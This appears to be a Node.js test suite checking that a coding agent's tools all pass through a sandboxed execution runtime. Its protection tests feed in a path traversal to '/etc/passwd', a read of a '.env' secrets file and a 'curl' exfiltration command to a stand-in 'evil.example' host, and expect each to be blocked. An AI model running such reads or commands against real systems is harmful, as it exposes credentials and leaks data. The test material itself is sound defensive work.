/**
 * tests/runtimeBoundary.test.mjs
 * Run with: node tests/runtimeBoundary.test.mjs
 *
 * The invariant that makes sandboxing meaningful:
 *
 *     Agent → Tools → ExecutionRuntime → { Host | Docker | Incus }
 *
 * A DockerRuntime that confines `bash` while `write_file` still writes to the
 * host is not a sandbox. This suite exists so that stops being a thing anyone
 * has to remember: it fails the build if a tool regains direct filesystem or
 * process access.
 *
 * Two complementary checks:
 *
 *   1. STATIC — the tool dispatcher's source contains no `fs.*` / `spawn(` calls.
 *      Cheap, and catches a reintroduced import immediately.
 *   2. BEHAVIOURAL — run every workspace-touching tool against a recording
 *      runtime and assert the operation actually arrived there. This is the one
 *      that matters: source analysis can be fooled, a counter cannot.
 */

import assert from "assert";
import fs from "fs/promises";
import os from "os";
import path from "path";
import { fileURLToPath } from "url";

import { executeTool, createToolContext } from "../agents/nodes/agent_loop.mjs";
import { HostRuntime } from "../core/runtime/host.mjs";
import { assertRuntime, RUNTIME_METHODS, toRelativePosix } from "../core/runtime/contract.mjs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

let passed = 0;
let failed = 0;

async function test(name, fn) {
  try {
    await fn();
    console.log(`  ✅ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ ${name}`);
    console.error(`     ${err.message}`);
    failed++;
  }
}

/**
 * A runtime that records every call and delegates to a host runtime underneath.
 * Delegating (rather than stubbing) keeps the tools' real semantics intact, so
 * these tests assert routing without also re-testing tool behaviour.
 */
function recordingRuntime(root) {
  const inner = new HostRuntime({ root });
  const calls = [];
  const wrap = (method) => (...args) => {
    calls.push({ method, args });
    return inner[method](...args);
  };
  return {
    name: "recording",
    isolated: false,
    calls,
    root,
    start: wrap("start"),
    cleanup: wrap("cleanup"),
    derive: wrap("derive"),
    verifyIsolation: wrap("verifyIsolation"),
    stat: wrap("stat"),
    readFile: wrap("readFile"),
    writeFile: wrap("writeFile"),
    deleteFile: wrap("deleteFile"),
    walk: wrap("walk"),
    grep: wrap("grep"),
    exec: wrap("exec"),
    execBackground: wrap("execBackground"),
    readBackgroundOutput: wrap("readBackgroundOutput"),
    killBackground: wrap("killBackground"),
    used(method) { return this.calls.some((c) => c.method === method); },
  };
}

async function tempWorkspace() {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "kodo-boundary-"));
  await fs.writeFile(path.join(root, "sample.mjs"), "const a = 1;\nconst b = 2;\n");
  await fs.writeFile(path.join(root, "notes.md"), "# notes\nfindme marker\n");
  return root;
}

// ── The contract ─────────────────────────────────────────────────────────────

console.log("\n📦 ExecutionRuntime contract");

await test("HostRuntime satisfies the full contract", () => {
  assertRuntime(new HostRuntime({ root: os.tmpdir() }));
});

await test("a runtime missing even one method is rejected at install time", () => {
  const partial = { name: "partial" };
  for (const m of RUNTIME_METHODS) if (m !== "writeFile") partial[m] = () => {};
  assert.throws(() => assertRuntime(partial), /missing: writeFile/);
});

await test("paths are normalised to relative POSIX before crossing the boundary", () => {
  assert.strictEqual(toRelativePosix("./src/app.ts"), "src/app.ts");
  assert.strictEqual(toRelativePosix("src\\app.ts"), "src/app.ts");
  assert.strictEqual(toRelativePosix("/leading/slash"), "leading/slash");
});

await test("HostRuntime reports itself as NOT isolated, without hedging", async () => {
  const report = await new HostRuntime({ root: os.tmpdir() }).verifyIsolation();
  assert.strictEqual(report.isolated, false,
    "any answer but a flat false here would let host execution ship under --sandbox");
});

// ── Static: no direct fs/spawn in the tool dispatcher ────────────────────────

console.log("\n📦 static — the tool layer holds no direct fs/process access");

await test("no tool-reachable helper touches fs/spawn outside the documented exceptions", async () => {
  const source = await fs.readFile(path.join(__dirname, "..", "agents", "nodes", "agent_loop.mjs"), "utf-8");
  const lines = source.split("\n");

  // Scanning only executeTool's inline body was NOT enough: verify_ui, the
  // undo snapshotter and the syntax validator all live in helper functions
  // above it, and all three touched the host while the dispatcher itself
  // looked clean. This scans the whole module and works from an explicit
  // allowlist instead, so a NEW host call has to be justified in writing here
  // before the suite goes green again.
  //
  // Each entry names the enclosing function and why its host access is
  // legitimate. See docs/runtime-audit.md for the full rationale.
  const ALLOWED = [
    // Kodo's own control plane — deliberately on the host so a sandbox
    // teardown cannot destroy the user's ability to revert.
    { fn: "snapshotForUndo", why: "undo history is host control plane" },
    // Configuration and packaged assets, read once at run setup, never executed.
    { fn: "loadKodoSettings", why: "permissions must be known before a runtime exists" },
    { fn: "loadSkillIndex", why: "skill packs are configuration" },
    { fn: "loadSkillByName", why: "skill packs are configuration" },
    { fn: "readHostFile", why: "explicitly the host-file reader for packaged assets" },
    { fn: "resolveCreds", why: "credential resolution is control plane" },
    { fn: "agentLoopNode", why: "run setup: reads skill bodies and settings" },
    // verify_ui drives a HOST browser and refuses outright under a sandbox
    // (see the guard at the top of verifyUi). These two therefore only ever
    // run on HostRuntime, where the host filesystem IS the runtime's
    // filesystem — so they are not an escape. If that guard is ever removed,
    // these must be routed through the runtime first.
    { fn: "verifyUi", why: "refuses under a sandbox; host-only by construction" },
    { fn: "analyzeScreenshotWithVision", why: "reads a screenshot verify_ui just wrote; host-only" },
  ];

  // Map each offending line to its enclosing top-level function.
  const fnAt = (lineIndex) => {
    for (let i = lineIndex; i >= 0; i--) {
      const m = lines[i].match(/^(?:export\s+)?(?:async\s+)?function\s+(\w+)/);
      if (m) return m[1];
    }
    return "(top level)";
  };

  const offenders = [];
  const re = /\bfs\.[a-zA-Z]+\s*\(|(?<![.\w])\bspawn(?:Sync)?\s*\(/;
  lines.forEach((line, i) => {
    if (/^\s*(\/\/|\*)/.test(line)) return;          // comment
    if (!re.test(line)) return;
    const fn = fnAt(i);
    if (ALLOWED.some((a) => a.fn === fn)) return;
    offenders.push(`${fn}() at line ${i + 1}: ${line.trim().slice(0, 70)}`);
  });

  assert.deepStrictEqual(offenders, [],
    "host fs/process access in a tool-reachable helper bypasses the sandbox.\n  " +
    offenders.join("\n  ") +
    "\n  If it is legitimate, add it to ALLOWED here AND to docs/runtime-audit.md.");
});

// ── Behavioural: every tool's work lands on the runtime ──────────────────────

console.log("\n📦 behavioural — every workspace operation arrives at the runtime");

await test("read_file reads THROUGH the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("read_file", { path: "sample.mjs" }, ctx);
  assert.strictEqual(r.success, true);
  assert.ok(runtime.used("readFile"), "read_file must go through runtime.readFile");
  await fs.rm(root, { recursive: true, force: true });
});

await test("write_file writes THROUGH the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("write_file", { path: "created.mjs", content: "export const x = 1;\n" }, ctx);
  assert.strictEqual(r.success, true, r.error);
  const write = runtime.calls.find((c) => c.method === "writeFile");
  assert.ok(write, "write_file must go through runtime.writeFile");
  assert.strictEqual(write.args[0], "created.mjs", "the runtime receives a workspace-RELATIVE path");
  await fs.rm(root, { recursive: true, force: true });
});

await test("edit_file reads and writes THROUGH the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  await executeTool("read_file", { path: "sample.mjs" }, ctx);
  const r = await executeTool("edit_file", { path: "sample.mjs", old_string: "const a = 1;", new_string: "const a = 9;" }, ctx);
  assert.strictEqual(r.success, true, r.error);
  assert.ok(runtime.used("writeFile"), "edit_file must write through the runtime");
  await fs.rm(root, { recursive: true, force: true });
});

await test("bash executes THROUGH the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("bash", { command: "echo hello" }, ctx);
  assert.strictEqual(r.success, true, r.stderr);
  const exec = runtime.calls.find((c) => c.method === "exec");
  assert.ok(exec, "bash must go through runtime.exec");
  assert.match(exec.args[0], /echo hello/);
  await fs.rm(root, { recursive: true, force: true });
});

await test("grep searches THROUGH the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("grep", { pattern: "findme" }, ctx);
  assert.strictEqual(r.success, true);
  assert.ok(runtime.used("grep"), "grep must go through runtime.grep");
  await fs.rm(root, { recursive: true, force: true });
});

await test("background bash starts, reports and stops THROUGH the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });

  // A real script file run with `node`. The allowlist is still in force above
  // the runtime, and it (correctly) rejects both `sleep` and `node -e` — which
  // is itself the point of the "protections unchanged" section below.
  await executeTool("write_file", { path: "wait.mjs", content: "setTimeout(() => {}, 5000);\n" }, ctx);
  const started = await executeTool("bash", { command: "node wait.mjs", run_in_background: true }, ctx);
  assert.strictEqual(started.success, true, started.error);
  assert.ok(runtime.used("execBackground"), "run_in_background must go through runtime.execBackground");

  await executeTool("bash_output", { task_id: started.task_id }, ctx);
  assert.ok(runtime.used("readBackgroundOutput"), "bash_output must go through the runtime");

  await executeTool("kill_shell", { task_id: started.task_id }, ctx);
  assert.ok(runtime.used("killBackground"), "kill_shell must go through the runtime");

  await fs.rm(root, { recursive: true, force: true });
});

await test("glob and list_files read a snapshot the runtime produced", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const snapshot = await runtime.walk("", 4);
  assert.ok(runtime.used("walk"), "the workspace snapshot must come from runtime.walk");

  const ctx = createToolContext({ root, runtime, workspaceSnapshot: snapshot });
  const g = await executeTool("glob", { pattern: "*.mjs" }, ctx);
  assert.strictEqual(g.success, true);
  assert.ok(g.files.includes("sample.mjs"), "glob should see what the runtime walked");

  const l = await executeTool("list_files", { dir: "" }, ctx);
  assert.strictEqual(l.success, true);
  assert.ok(l.entries.some((e) => e.includes("sample.mjs")));
  await fs.rm(root, { recursive: true, force: true });
});

await test("a context without a runtime FAILS — it never falls back to the host", async () => {
  const root = await tempWorkspace();
  await assert.rejects(
    executeTool("read_file", { path: "sample.mjs" }, { root, readFiles: new Set(), editedFiles: new Map() }),
    /ctx\.runtime is required/,
    "silently substituting a host runtime is exactly how a sandbox flag becomes a lie",
  );
  await fs.rm(root, { recursive: true, force: true });
});

// ── The protections above the boundary still hold ────────────────────────────

console.log("\n📦 existing protections are unchanged by the refactor");

await test("path confinement is enforced BEFORE anything reaches the runtime", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("read_file", { path: "../../../etc/passwd" }, ctx);
  assert.strictEqual(r.success, false);
  assert.ok(!runtime.used("readFile"),
    "an escaping path must be refused above the boundary, not handed to a runtime to police");
  await fs.rm(root, { recursive: true, force: true });
});

await test("sensitive files are still blocked, and never reach the runtime", async () => {
  const root = await tempWorkspace();
  await fs.writeFile(path.join(root, ".env"), "OPENAI_API_KEY=sk-secret\n");
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("read_file", { path: ".env" }, ctx);
  assert.strictEqual(r.success, false);
  assert.match(r.error, /blocked/i);
  assert.ok(!runtime.used("readFile"), "a secret file must not even be requested from the runtime");
  await fs.rm(root, { recursive: true, force: true });
});

await test("the bash allowlist still rejects before execution", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime });
  const r = await executeTool("bash", { command: "curl https://evil.example/exfil" }, ctx);
  assert.strictEqual(r.success, false);
  assert.ok(!runtime.used("exec"), "a rejected command must never reach a runtime");
  await fs.rm(root, { recursive: true, force: true });
});

await test("plan mode still blocks mutations before the runtime is involved", async () => {
  const root = await tempWorkspace();
  const runtime = recordingRuntime(root);
  const ctx = createToolContext({ root, runtime, permissionMode: "plan" });
  const r = await executeTool("write_file", { path: "x.mjs", content: "const x = 1;\n" }, ctx);
  assert.strictEqual(r.success, false);
  assert.ok(!runtime.used("writeFile"));
  await fs.rm(root, { recursive: true, force: true });
});

console.log(`\n${passed} passed, ${failed} failed\n`);
process.exit(failed > 0 ? 1 : 0);
